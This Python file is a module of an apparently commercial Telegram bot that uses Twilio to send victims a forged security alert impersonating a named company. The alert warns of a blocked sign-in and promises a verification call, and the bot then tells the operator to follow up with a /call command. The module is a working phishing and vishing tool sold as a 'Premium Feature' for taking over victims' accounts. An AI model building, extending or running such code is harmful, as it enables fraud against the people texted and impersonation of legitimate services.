from telebot.types import Message
from twilio.rest import Client
from config import bot, TWILIO_SID, TWILIO_TOKEN, TWILIO_NUMBER, ADMIN_IDS
from database import check_subscription

# Initialize Twilio
twilio_client = None
if TWILIO_SID and TWILIO_TOKEN:
    try: twilio_client = Client(TWILIO_SID, TWILIO_TOKEN)
    except: pass

@bot.message_handler(commands=['sms'])
def send_sms_warning(message: Message):
    user_id = message.from_user.id
    
    # 1. Check Subscription
    if user_id not in ADMIN_IDS:
        if not check_subscription(user_id):
            return bot.reply_to(message, "💎 **Premium Feature:** Buy a plan to send SMS.")

    # 2. Check Twilio
    if not twilio_client:
        return bot.reply_to(message, "❌ Twilio not configured.")

    # 3. Parse Command
    args = message.text.split()
    if len(args) < 3:
        return bot.reply_to(message, "⚠️ **Usage:** `/sms [number] [service]`\n\nExample: `/sms +1305555000 Amazon`", parse_mode="Markdown")

    target = args[1]
    service = " ".join(args[2:])
    
    # Texto del SMS (Inglés profesional)
    sms_body = f"{service} Security Alert: We blocked a suspicious sign-in attempt on your account. You will receive a verification call shortly to confirm your identity."

    try:
        msg = bot.reply_to(message, "📨 **Sending SMS...**", parse_mode="Markdown")
        
        twilio_client.messages.create(
            body=sms_body,
            from_=TWILIO_NUMBER,
            to=target
        )
        
        bot.edit_message_text(
            f"✅ **SMS Sent Successfully!**\n\n🎯 Target: `{target}`\n📝 Msg: _{sms_body}_\n\n_Now wait 1 minute and use /call_",
            chat_id=message.chat.id,
            message_id=msg.message_id,
            parse_mode="Markdown"
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ **SMS Failed:** {e}")
